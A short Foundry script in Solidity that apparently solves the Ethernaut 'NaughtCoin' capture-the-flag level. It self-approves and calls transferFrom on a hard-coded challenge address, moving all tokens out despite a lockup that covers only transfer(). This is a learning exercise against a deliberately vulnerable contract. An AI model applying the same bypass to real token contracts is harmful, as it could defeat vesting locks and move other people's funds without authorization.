// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {NaughtCoin} from "src/15NaughtCoin.sol";

contract NaughtCoinAttack is Script {
    address constant CHALLENGE = 0xe094Ed01904974918D395377A26993dB44E4a566;
    NaughtCoin public naughtCoin;

    function run() public {
        vm.startBroadcast(); // Starts broadcasting transactions
        naughtCoin = NaughtCoin(CHALLENGE);
        naughtCoin.approve(msg.sender, type(uint256).max);
        naughtCoin.transferFrom(msg.sender, CHALLENGE, naughtCoin.balanceOf(msg.sender));
        console.log("Balance after attack:", naughtCoin.balanceOf(msg.sender));
        vm.stopBroadcast();
    }
}
